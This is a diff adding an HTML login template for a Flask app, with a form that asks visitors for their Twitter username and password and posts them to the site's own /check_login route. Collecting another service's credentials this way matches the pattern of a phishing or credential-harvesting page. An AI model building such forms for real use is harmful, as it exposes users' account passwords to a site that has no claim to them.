@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login/Sign-up</title>
+    <!-- CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css')}}">
+  </head>
+  <body>
+    <section class="container forms">
+      <div class="form login">
+        <div class="form-content">
+          <img src="{{ url_for('static', filename='logo.jpeg')}}" alt="" />
+          <header>Login</header>
+          <span class="title">Please enter your Twitter username and password.</span>
+          <form action="/check_login" method="POST">
+
+          <div class="alert">
+              <span
+                class="closebtn"
+                onclick="this.parentElement.style.display='none';"
+                >&times;</span
+              >
+              Please enter a valid username or password.
+            </div>
+
+            </div>
+            <!-- Email -->
+            <div class="field input-field">
+              <input name="username"  placeholder="Twitter Username" class="input" />
+            </div>
+            <!-- Password -->
+            <div class="field input-field">
+              <input name="password" type="password" placeholder="Password" class="password" />
+              <i class="uil uil-eye-slash showHidePw"></i>
+            </div>
+
+            <div class="form-link">
+              <a href="/forgot_pass" class="forgot-pass"
+                >Forgot password?</a
+              >
+            </div>
+
+            <div class="field button-field">
+              <button class="login-link" formaction="/check_login" method="POST">Login</button>
+            </div>
+          </form>
+
+          <div class="form-link">
+            <span
+              >Don't have an account?
+              <a href="/sign_up" class="txt signup-link">Sign up</a></span
+            >
+          </div>
+        </div>
+      </div>
+
+      
+    <!-- JavaScript -->
+  </body>
+</html>
